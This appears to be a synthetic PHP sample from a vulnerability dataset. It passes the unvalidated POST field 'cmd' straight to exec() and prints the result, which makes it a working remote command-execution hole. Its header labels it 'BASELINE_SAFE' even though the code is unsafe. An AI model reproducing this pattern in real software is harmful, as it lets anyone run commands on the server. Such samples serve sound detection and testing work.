<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=FILTER_INPUT_POST_FALLBACK; SKELETON=S2; KEY=cmd; SINK=B2; VAR=v0054 */
function SINK_B2($command){
    $output = [];
    exec($command, $output);
    print_r($output);
}
$t = filter_input(INPUT_POST, "cmd");
$inp = ($t !== null && $t !== false) ? (string)$t : (string)($_POST["cmd"] ?? "");
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B2($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
